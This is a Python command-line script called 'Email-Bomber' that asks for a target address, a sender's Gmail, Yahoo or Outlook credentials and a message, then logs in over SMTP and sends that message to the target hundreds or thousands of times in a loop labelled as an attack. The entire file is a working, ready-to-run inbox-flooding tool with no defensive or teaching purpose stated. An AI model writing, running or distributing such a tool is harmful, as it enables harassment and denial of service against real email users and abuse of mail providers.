import stdiomask
import smtplib
import getpass
import time
import sys
import os

def cls():
    if os.name is not 'nt':
         os.system('clear')
    else:
        os.system('cls')

version = '.ALPHA 1.0'

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    SPACE = '      '

cls()

def banner():
    print(f"""{bcolors.GREEN}
                            /                                               
                            \___'
                              |
                          ,--'#`--.
                          |#######|
                       _.-'#######`-._
                    ,-'###############`-.
                  ,'#####################`,
                 /#########################\\
                |###########################|
               |#############################|
               |#############################|
               |#############################|
               |#############################|
                |###########################|
                 \#########################/
                  `.#####################,'
                    `._###############_,'             
                       `--..#####..--'
    {bcolors.YELLOW}
        ______          ____                  __   
       / ____/___ ___  / __ )____  ____ ___  / /_  ___  _____
      / __/ / __ `__ \/ __  / __ \/ __ `__ \/ __ \/ _ \/ ___/
     / /___/ / / / / / /_/ / /_/ / / / / / / /_/ /  __/ /    
    /_____/_/ /_/ /_/_____/\____/_/ /_/ /_/_.___/\___/_/

        Author: {bcolors.RED}fulltime_Me{bcolors.YELLOW}  
    """)
    print(f'{bcolors.SPACE}+[+[+[ {bcolors.GREEN}Email-Bomber{bcolors.RED} v{version}{bcolors.YELLOW} +]+]+')
    print(f'{bcolors.SPACE}+[+[+[ {bcolors.GREEN}made with VS-code{bcolors.YELLOW} +]+]+')
    print(f"""
    \\\\\\__________________________________________________________________________///
    ///                                                                          \\\\\\ {bcolors.RESET}\n\n""")

class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(f'{bcolors.SPACE}{bcolors.YELLOW}+[+[+[ Initializing program ]+]+]+')
            time.sleep(2)
            self.target = str(input(f'{bcolors.SPACE}{bcolors.YELLOW}[~] Target: {bcolors.RED}'))
            print(bcolors.YELLOW)
            print(f'{bcolors.SPACE}.-----[ MODES ]------.')
            print(f'{bcolors.SPACE}|                    |')
            print(f'{bcolors.SPACE}|     1:(1000)       |')
            print(f'{bcolors.SPACE}|     2:(500)        |')
            print(f'{bcolors.SPACE}|     3:(250)        |')
            print(f'{bcolors.SPACE}|     4:(custom)     |')
            print(f'{bcolors.SPACE}`--------------------´')
            print(bcolors.RESET)
            self.mode = int(input(f'{bcolors.SPACE}{bcolors.YELLOW}[~] Mode: {bcolors.GREEN}'))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print(f'{bcolors.SPACE}{bcolors.RED}[-] Invalid Option!')
                sys.exit(1)
        except Exception as e:
            print(f'{bcolors.SPACE}{bcolors.RED}[-] ERROR: {e}')
            time.sleep(5)
            print(bcolors.RESET)
            sys.exit(1)

    def init(self):
        try:
            print(f'\n{bcolors.SPACE}{bcolors.YELLOW}+[+[+[ Setting up bomb ]+]+]+')
            time.sleep(1)
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(f'{bcolors.SPACE}{bcolors.YELLOW}[~] Custom amount: {bcolors.GREEN}'))
            
            print(f'\n{bcolors.SPACE}{bcolors.YELLOW}+[+[+[ You have selected BOMB mode {bcolors.RED}{self.mode} {bcolors.YELLOW}and {bcolors.RED}{self.amount} {bcolors.YELLOW}emails ]+]+]+')
            time.sleep(1)
        except Exception as e:
            print(f'{bcolors.SPACE}{bcolors.RED}[-] ERROR: {e}')
            time.sleep(5)
            print(bcolors.RESET)
            sys.exit(1)
        
    def build(self):
        try:
            print(f'\n{bcolors.SPACE}{bcolors.YELLOW}+[+[+[ Setting up email || logging in ]+]+]+')
            time.sleep(1)
            print(bcolors.YELLOW)
            print(f'{bcolors.SPACE}.----[ SERVERS ]-------.')
            print(f'{bcolors.SPACE}|                      |')
            print(f'{bcolors.SPACE}|     1:(Gmail)        |')
            print(f'{bcolors.SPACE}|     2:(Yahoo)        |')
            print(f'{bcolors.SPACE}|     3:(OutLook)      |')
            print(f'{bcolors.SPACE}`----------------------´')
            print(bcolors.RESET)    
            self.server = str(input(f'{bcolors.SPACE}{bcolors.YELLOW}[~] Email server: {bcolors.GREEN}'))
            premade = ['1', '2', '3']
            default_port = True
            # if self.server is not in premade:
                # default_port = False
                # self.port = int(input(f'{bcolors.SPACE}{bcolors.YELLOW}[~] Custom port: {bcolors.RED}'))

            if default_port == True:
                self.port = int(587)
            
            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outLook.com'

            self.fromAddr = str(input(f'{bcolors.SPACE}{bcolors.YELLOW}[~] From address: {bcolors.GREEN}'))    
            self.fromPwd = str(stdiomask.getpass(f'{bcolors.SPACE}{bcolors.YELLOW}[~] From password: {bcolors.GREEN}'))        
            self.subject = str(input(f'{bcolors.SPACE}{bcolors.YELLOW}[~] Subject: {bcolors.GREEN}'))
            self.message = str(input(f'{bcolors.SPACE}{bcolors.YELLOW}[~] Message: {bcolors.GREEN}'))

            self.msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'{bcolors.SPACE}{bcolors.RED}[-] ERROR: {e}')
            time.sleep(5)
            print(bcolors.RESET)
            sys.exit(1)
    
    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(f'{bcolors.SPACE}{bcolors.GREEN}[+]{bcolors.YELLOW} BOMB: ({bcolors.RED}{self.count}{bcolors.YELLOW})')
        except Exception as e:
            print(f'{bcolors.SPACE}{bcolors.RED}[-] ERROR: {e}')
            time.sleep(5)
            print(bcolors.RESET)
            sys.exit(1)

    def attack(self):
        print(f'\n{bcolors.SPACE}{bcolors.YELLOW}+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(f'\n{bcolors.SPACE}{bcolors.YELLOW}+[+[+[ Attack finished ]+]+]+')
        
if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.init()
    bomb.build()
    bomb.attack()
    print(bcolors.RESET)
    input()